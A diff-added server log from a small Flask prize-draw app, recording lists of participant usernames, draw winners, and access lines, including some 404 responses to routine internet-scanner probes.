+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '霁青梦铳-', '氧化酚', '氪与延迟', '山元酯醇', '是也泽呀', '1薰ya', '夜宸乄', '乘风破浪_qwq', '晴诗-Sveinn', '晏枸斜晖', '觉对许早苗', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '山谷中的质数', '伽鄒閁', '戚道江', '西行寺墨墨子', '山夜梓黎', '山阴剡溪客', '冬暖山岚', 'X极星', '安东尼赛高', 'WolfeKesentel', '鹿语诉说', '致密的路罐薄膜', '热可可200505', '明夏洛河', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '浮云苍苟丶', '黑渊a龙夏', '给人整无语了咧', '永遠054742022', 'Sigurd_Ara', '三凉1124', '-岚崎-', '二喵喵奇', 'ZemA市民集市', '星宇又饿了', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '停雲馆--', 'kkkkkkkce', '笹旸', '刊刊need', '猫狼森淼', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', '用户7553278814', '勇敢的龟龟mzh', '杭行宇', '方箱纸', '四爪噬金兽', '墨小夜201205', '埃尔不污', 'Rim68145', '来自极北的雪飒', '超市秦轲', '三味竹饭', '猫切吸果冻', 'Xris__', '白韩青', '只想摸鱼fishcat', '東方神狐月', 'ice_BX菌', '锦莹逍泽丶轩', '为这世界献上祝福', '二喵奇', '乌鸫东冬面', '小何宝宝ovo', '用户7923633187', 'Diamond_王', '用户7579686646', '安东尼的指虎', 'WTF这是', '一块冻铁', '聚合果酱', '阿淼淼水水水', '没有脑子的梅林', '用户7933471292', '重生之我是山宝枕边人', '呜呜球球出点货', '裟椤mp4', '是小猪叔', 'kkskshd', '伯利昂_', '滴雾任歌骑冻']
+INFO:main:中奖者：晏枸斜晖, 狠狠创了, Sigurd_Ara
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:48:42] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：给人整无语了咧, -岚崎-, 霁青梦铳-
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:50:05] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['不懂公主0的有难了', '扭扭的很安心', '邻居家的小孩你活了', '调味市路人女', '卡卡咖_', '眠处百花深_', '是你打的120吗', '锁妹一', '淋雨雪糕猫', '羊羊羊羊君_', '世一会是世界第一', '小猫在流泪', '雨后青青小草', '您今天吃了咩', '还我睡眠啊_', '雨也没有那么安逸了', 'qwxlllss', '跨过那条河流', '乌龙桃子厨', '轻栀迥炙', '三分讥笑凤梨头', '喵咪妹宝', '故里逢昭', '我都知道_不必跟我说了', '我杯世一', '你在讲什么我不知道呀', '以撒球权维护中心', '魔芋爽拌炸洋芋', '就你会讲捏丷', '半熟芝士蒸好吃', 'Sheepssstar-', '俺胡汉三又回来了_', '乌揽', '露莱huhu', '云雾o_O', '小草养殖户', '寒黎夏Lx', '长白山矿泉水瓶', '小王天天开心-_-', '阿玖玖玖玖酒', '齐逼小内裤', '厄退潔', 'whisper_--', '风吹小草吹风', '朝祈渊', '小世_鸡蛋羹', '全家出道', '修缘为声', '高桥咲咲咲咲咲', '姽妻', '今今梨', 'yoichi香草泥', '龙虾味洁咪酱', '用户7609747632', '不要捡空投', '咬一口奶牛小猫', 'AAA凛冬朝', '白白似快']
+INFO:main:中奖者：姽妻, 风吹小草吹风, 用户7609747632
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:50:15] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['不懂公主0的有难了', '扭扭的很安心', '调味市路人女', '卡卡咖_', '锁妹一', '羊羊羊羊君_', '世一会是世界第一', '小猫在流泪', '雨后青青小草', '还我睡眠啊_', '雨也没有那么安逸了', 'qwxlllss', '乌龙桃子厨', '喵咪妹宝', '故里逢昭', '我都知道_不必跟我说了', '我杯世一', '你在讲什么我不知道呀', '就你会讲捏丷', '半熟芝士蒸好吃', 'Sheepssstar-', '俺胡汉三又回来了_', '乌揽', '露莱huhu', '小草养殖户', '长白山矿泉水瓶', '小王天天开心-_-', '齐逼小内裤', '厄退潔', 'whisper_--', '风吹小草吹风', '小世_鸡蛋羹', '全家出道', '今今梨', '用户7609747632', '不要捡空投', '咬一口奶牛小猫', 'AAA凛冬朝', '白白似快']
+INFO:main:中奖者：qwxlllss
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:51:37] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['不懂公主0的有难了', '扭扭的很安心', '邻居家的小孩你活了', '调味市路人女', '卡卡咖_', '眠处百花深_', '是你打的120吗', '锁妹一', '淋雨雪糕猫', '羊羊羊羊君_', '世一会是世界第一', '小猫在流泪', '雨后青青小草', '您今天吃了咩', '还我睡眠啊_', '雨也没有那么安逸了', 'qwxlllss', '跨过那条河流', '乌龙桃子厨', '轻栀迥炙', '三分讥笑凤梨头', '喵咪妹宝', '故里逢昭', '我都知道_不必跟我说了', '我杯世一', '你在讲什么我不知道呀', '以撒球权维护中心', '魔芋爽拌炸洋芋', '就你会讲捏丷', '半熟芝士蒸好吃', 'Sheepssstar-', '俺胡汉三又回来了_', '乌揽', '露莱huhu', '云雾o_O', '小草养殖户', '寒黎夏Lx', '长白山矿泉水瓶', '小王天天开心-_-', '阿玖玖玖玖酒', '齐逼小内裤', '厄退潔', 'whisper_--', '风吹小草吹风', '朝祈渊', '小世_鸡蛋羹', '全家出道', '修缘为声', '高桥咲咲咲咲咲', '姽妻', '今今梨', 'yoichi香草泥', '龙虾味洁咪酱', '用户7609747632', '不要捡空投', '咬一口奶牛小猫', 'AAA凛冬朝', '白白似快']
+INFO:main:中奖者：就你会讲捏丷
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:52:19] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '晴诗-Sveinn', '黑渊a龙夏', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '伯利昂_', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：晏枸斜晖
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:07:55] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:07:55] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:07:56] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:07:56] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '霁青梦铳-', '氧化酚', '氪与延迟', '山元酯醇', '是也泽呀', '1薰ya', '夜宸乄', '乘风破浪_qwq', '晴诗-Sveinn', '晏枸斜晖', '觉对许早苗', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '山谷中的质数', '伽鄒閁', '戚道江', '西行寺墨墨子', '山夜梓黎', '山阴剡溪客', '冬暖山岚', 'X极星', '安东尼赛高', 'WolfeKesentel', '鹿语诉说', '致密的路罐薄膜', '热可可200505', '明夏洛河', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '浮云苍苟丶', '黑渊a龙夏', '给人整无语了咧', '永遠054742022', 'Sigurd_Ara', '三凉1124', '-岚崎-', '二喵喵奇', 'ZemA市民集市', '星宇又饿了', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '停雲馆--', 'kkkkkkkce', '笹旸', '刊刊need', '猫狼森淼', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', '用户7553278814', '勇敢的龟龟mzh', '杭行宇', '方箱纸', '四爪噬金兽', '墨小夜201205', '埃尔不污', 'Rim68145', '来自极北的雪飒', '超市秦轲', '三味竹饭', '猫切吸果冻', 'Xris__', '白韩青', '只想摸鱼fishcat', '東方神狐月', 'ice_BX菌', '锦莹逍泽丶轩', '为这世界献上祝福', '二喵奇', '乌鸫东冬面', '小何宝宝ovo', '用户7923633187', 'Diamond_王', '用户7579686646', '安东尼的指虎', 'WTF这是', '一块冻铁', '聚合果酱', '阿淼淼水水水', '没有脑子的梅林', '用户7933471292', '重生之我是山宝枕边人', '呜呜球球出点货', '裟椤mp4', '是小猪叔', 'kkskshd', '伯利昂_', '滴雾任歌骑冻']
+INFO:main:中奖者：言曦咕了, 二喵奇, kkskshd
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:09:13] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '霁青梦铳-', '氧化酚', '氪与延迟', '山元酯醇', '是也泽呀', '1薰ya', '夜宸乄', '乘风破浪_qwq', '晴诗-Sveinn', '晏枸斜晖', '觉对许早苗', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '山谷中的质数', '伽鄒閁', '戚道江', '西行寺墨墨子', '山夜梓黎', '山阴剡溪客', '冬暖山岚', 'X极星', '安东尼赛高', 'WolfeKesentel', '鹿语诉说', '致密的路罐薄膜', '热可可200505', '明夏洛河', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '浮云苍苟丶', '黑渊a龙夏', '给人整无语了咧', '永遠054742022', 'Sigurd_Ara', '三凉1124', '-岚崎-', '二喵喵奇', 'ZemA市民集市', '星宇又饿了', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '停雲馆--', 'kkkkkkkce', '笹旸', '刊刊need', '猫狼森淼', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', '用户7553278814', '勇敢的龟龟mzh', '杭行宇', '方箱纸', '四爪噬金兽', '墨小夜201205', '埃尔不污', 'Rim68145', '来自极北的雪飒', '超市秦轲', '三味竹饭', '猫切吸果冻', 'Xris__', '白韩青', '只想摸鱼fishcat', '東方神狐月', 'ice_BX菌', '锦莹逍泽丶轩', '为这世界献上祝福', '二喵奇', '乌鸫东冬面', '小何宝宝ovo', '用户7923633187', 'Diamond_王', '用户7579686646', '安东尼的指虎', 'WTF这是', '一块冻铁', '聚合果酱', '阿淼淼水水水', '没有脑子的梅林', '用户7933471292', '重生之我是山宝枕边人', '呜呜球球出点货', '裟椤mp4', '是小猪叔', 'kkskshd', '伯利昂_', '滴雾任歌骑冻']
+INFO:main:中奖者：晏枸斜晖, 猫狼森淼, 浮云苍苟丶
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:10:39] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：热可可200505, 来自极北的雪飒, -岚崎-
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:15:47] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：啊叭叭叭叭叭叭叭叭叭叭叭叭叭, kkskshd, Eltashi13
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 19:17:01] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:83.97.73.245 - - [18/Jul/2024 20:08:29] "[33mGET /jars HTTP/1.1[0m" 404 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['A_tinder一粒火', '热带雨咖雨带热', '自转圆', '极韵君', '想要欧气满满ww', '爱好匿匿匿匿名', '朕就是如此青春的美boy', '穆录Talk穆录Draw', '喝一碗烫水', '如果我们迷失了', '这是只荷包蛋', '凌绫ye', 'sjgdqs', '-时茉-', '来一斤小面包_', '白越今天也要记得好好刷牙', '吉尔威', '不愿放弃二次元的甪', '苏淳颜', '长岸为蝉鸣加粟', '_犿卜三三', '丹青-ing', 'Kuri_久里', '在下舍舍望周知', '纯情农户', 'sayumi尹懿', 'IoO0IOops', 'SweetBlood甜血', 'jsdhwdmaX0420', '这不是一个不好听的ID', 'IVANplus-one', '种花家的小桃桃', 'IN-NO-TIME', '木叶染秋阳', '在森林彼端寻鱼', '夜雨4空阶', 'Reginasally', '四季春加点叶', 'AlinnDairy', '拾闻', '智慧养成达人', '水色林', 'Y_S23', 'Nicecoffee61183', '戟阙是只龙', 'RoseAndGrey', '_kiwi華_', '荃口', '行走中的九', '奶油煎蛋黄番茄汤', '还请不要离开爱的陷阱', '顾此南浔', '京城小红莲', '多说无益会自闭', '不改名字当我bot', 'SherbetWhite', '赛博咸鱼罐头贩卖机']
+INFO:main:中奖者：水色林, 白越今天也要记得好好刷牙, 纯情农户
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 20:49:06] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:94.156.66.82 - - [18/Jul/2024 21:14:40] "[33mCONNECT 45.61.136.175:7227 HTTP/1.1[0m" 404 -
+INFO:werkzeug:80.76.49.133 - - [18/Jul/2024 21:56:47] "[33mCONNECT 45.61.137.126:7227 HTTP/1.1[0m" 404 -
+INFO:werkzeug:159.65.111.231 - - [18/Jul/2024 23:04:02] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.79.102.88 - - [18/Jul/2024 23:09:43] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:95.214.27.225 - - [19/Jul/2024 02:29:01] "[33mGET http://example.com/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:95.214.27.225 - - [19/Jul/2024 02:29:01] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:95.214.27.225 - - [19/Jul/2024 02:29:02] "[33mGET http://example.com/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:95.214.27.225 - - [19/Jul/2024 02:29:02] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:94.156.71.235 - - [19/Jul/2024 03:50:15] "[33mCONNECT 45.61.136.175:7227 HTTP/1.1[0m" 404 -
+INFO:werkzeug:83.97.73.245 - - [19/Jul/2024 03:52:51] "[33mGET /jars HTTP/1.1[0m" 404 -
+INFO:werkzeug:205.210.31.232 - - [19/Jul/2024 04:29:23] "[33mGET / HTTP/1.0[0m" 404 -
